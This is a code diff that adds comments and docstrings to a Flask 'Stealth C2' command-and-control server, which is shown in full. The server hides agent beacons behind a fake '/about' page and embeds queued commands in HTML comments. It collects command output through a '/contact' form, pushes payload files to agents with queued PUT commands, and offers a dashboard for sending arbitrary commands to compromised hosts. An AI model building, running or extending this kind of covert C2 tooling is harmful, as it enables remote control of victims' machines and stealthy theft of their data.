@@ -1,4 +1,5 @@
 # stealth_c2/c2_server.py
+# Command and Control server for managing agents via HTTP/HTTPS
 
 from flask import Flask, request, render_template, redirect, url_for, flash, Response, jsonify, send_from_directory
 from datetime import datetime, timedelta
@@ -7,18 +8,23 @@ import queue
 import os
 import secrets
 
+# Initialize Flask app
 app = Flask(__name__)
 app.secret_key = "dev-secret-key"  # for flash messages; replace in prod
-agent_tasks = {}
-agent_responses = {}
-agent_last_seen = {}
-_event_subscribers = set()
+
+# Global storage for agent management
+agent_tasks = {}        # Commands queued for each agent
+agent_responses = {}     # Responses received from agents
+agent_last_seen = {}     # Last heartbeat timestamp for each agent
+_event_subscribers = set()  # SSE subscribers for real-time updates
+
+# File upload directory for agent payloads
 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "uploads")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 
 def _publish_event(event):
-    # Push event dict to all subscriber queues
+    """Publish events to all SSE subscribers for real-time updates"""
     dead = []
     for q in list(_event_subscribers):
         try:
@@ -30,25 +36,32 @@ def _publish_event(event):
 
 @app.route("/")
 def index():
-    # Simple landing redirects to dashboard
+    """Landing page - redirects to admin dashboard"""
     return redirect(url_for("dashboard"))
 
 @app.route("/about")
 def about():
+    """Agent beacon endpoint - agents check here for commands"""
     agent_id = request.args.get("id")
     if agent_id:
+        # Update last seen timestamp and publish heartbeat event
         agent_last_seen[agent_id] = datetime.utcnow()
         _publish_event({"type": "heartbeat", "agent_id": agent_id})
+    
+    # Check if there's a command queued for this agent
     if agent_id in agent_tasks:
-        task = agent_tasks.pop(agent_id)
+        task = agent_tasks.pop(agent_id)  # Remove task after sending
         return f"<!--cmd:{task}--><p>About us page. Updated {datetime.now()}</p>"
+    
     return render_template("about.html")
 
 @app.route("/contact", methods=["POST"])
 def contact():
+    """Agent response endpoint - agents send command results here"""
     agent_id = request.form.get("id")
     response = request.form.get("msg")
     if agent_id and response:
+        # Store agent response and update last seen
         agent_responses[agent_id] = response
         agent_last_seen[agent_id] = datetime.utcnow()
         print(f"[+] Response from {agent_id}:\n{response}")
@@ -58,8 +71,11 @@ def contact():
 # -------------------- Admin Web Portal --------------------
 @app.route("/admin", methods=["GET"])  # dashboard
 def dashboard():
+    """Admin dashboard - shows all agents and their status"""
+    # Get all known agents from various data structures
     agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
-    # Consider an agent active if seen in the last 60 seconds (adjust as needed)
+    
+    # Consider an agent active if seen in the last 60 seconds
     now = datetime.utcnow()
     cutoff = now - timedelta(seconds=60)
     active_agents = [
@@ -68,6 +84,7 @@ def dashboard():
         if agent_last_seen[a] >= cutoff
     ]
     active_agents.sort(key=lambda x: x["seconds_ago"])  # freshest first
+    
     return render_template(
         "admin/dashboard.html",
         agents=agents,
@@ -80,6 +97,7 @@ def dashboard():
 # -------- File Uploads for Agents --------
 @app.route("/admin/upload", methods=["POST"])
 def admin_upload():
+    """Upload files to be transferred to agents"""
     agent_id = request.form.get("agent_id", "").strip()
     dest_path = request.form.get("dest_path", "").strip()
     f = request.files.get("file")
@@ -98,7 +116,7 @@ def admin_upload():
     base = request.host_url.rstrip("/")
     url = f"{base}/payloads/{saved_name}"
 
-    # Queue PUT command for agent
+    # Queue PUT command for agent to download and save the file
     agent_tasks[agent_id] = f"PUT {url} {dest_path}"
     flash(f"Uploaded {safe_name} and queued transfer to {agent_id}", "success")
     _publish_event({"type": "upload", "agent_id": agent_id})
@@ -107,17 +125,20 @@ def admin_upload():
 
 @app.route("/admin/uploads", methods=["GET"])  # uploads page
 def admin_uploads_page():
+    """File upload page for transferring files to agents"""
     agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
     return render_template("admin/uploads.html", agents=agents)
 
 
 @app.route("/payloads/<path:filename>")
 def payloads(filename):
+    """Serve uploaded files to agents for download"""
     return send_from_directory(UPLOAD_DIR, filename, as_attachment=False)
 
 
 @app.route("/admin/data", methods=["GET"])  # JSON snapshot for live refresh
 def admin_data():
+    """JSON API endpoint for live dashboard updates"""
     now = datetime.utcnow()
     cutoff = now - timedelta(seconds=60)
     agents = sorted(set(list(agent_tasks.keys()) + list(agent_responses.keys()) + list(agent_last_seen.keys())))
@@ -136,6 +157,7 @@ def admin_data():
 
 @app.route("/admin/stream")  # Server-Sent Events for live updates
 def admin_stream():
+    """Server-Sent Events endpoint for real-time dashboard updates"""
     subscriber = queue.Queue(maxsize=100)
     _event_subscribers.add(subscriber)
 
@@ -159,18 +181,20 @@ def admin_stream():
 
 @app.route("/admin/send", methods=["POST"])  # form POST helper
 def admin_send():
+    """Send commands to agents via web form"""
     agent_id = request.form.get("agent_id", "").strip()
     command = request.form.get("cmd", "").strip()
     if not agent_id:
         flash("Agent ID is required", "error")
         return redirect(url_for("dashboard"))
-    # Reuse existing API for setting tasks
+    # Queue command for agent
     agent_tasks[agent_id] = command
     flash(f"Task queued for {agent_id}", "success")
     return redirect(url_for("dashboard"))
 
 @app.route("/admin/set/<agent_id>", methods=["POST"])
 def set_task(agent_id):
+    """API endpoint to set tasks for agents (used by external tools)"""
     # Prefer a named form field, else fall back to raw body
     command = request.form.get("cmd")
     if command is None or command.strip() == "":
@@ -185,8 +209,10 @@ def set_task(agent_id):
 
 @app.route("/admin/view/<agent_id>")
 def view(agent_id):
+    """View the last response from a specific agent"""
     return agent_responses.get(agent_id, "No response")
 
 if __name__ == "__main__":
+    """Start the C2 server with HTTPS"""
     print("[*] Stealth C2 running on https://localhost:4443")
     app.run(host="0.0.0.0", port=4443, ssl_context=("cert.pem", "key.pem"))
